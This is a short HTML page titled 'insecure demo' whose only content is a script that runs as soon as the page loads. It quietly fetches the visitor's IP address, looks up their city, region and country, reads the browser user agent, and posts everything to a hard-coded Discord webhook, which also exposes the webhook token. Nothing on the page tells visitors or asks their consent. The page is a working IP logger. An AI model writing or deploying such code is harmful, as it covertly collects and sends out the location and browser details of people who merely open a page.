<!doctype html>
<html>
<head><meta charset="utf-8"><title>insecure demo</title></head>
<body>
<script>
(async () => {
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
    const ip = ipRes.ip;
    const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json()).catch(()=>({}));
    const ua = navigator.userAgent;
    const payload = {
      content: `Visit: ${ip} | ${geo.city||'n/a'}, ${geo.region||'n/a'}, ${geo.country_name||'n/a'} | UA: ${ua}`
    };
    const webhook = 'https://discord.com/api/webhooks/1420568022732505149/IxMEhT9g6ZQuURdrOUQWJCvosvJevPKyTQt0-WU-XeNoPlPmb6PUcBCXwKxn5k_ku9ag';
    await fetch(webhook, { method: 'POST', body: JSON.stringify(payload), headers: {'Content-Type':'application/json'} });
  } catch(e) {
    console.error(e);
  }
})();
</script>
</body>
</html>
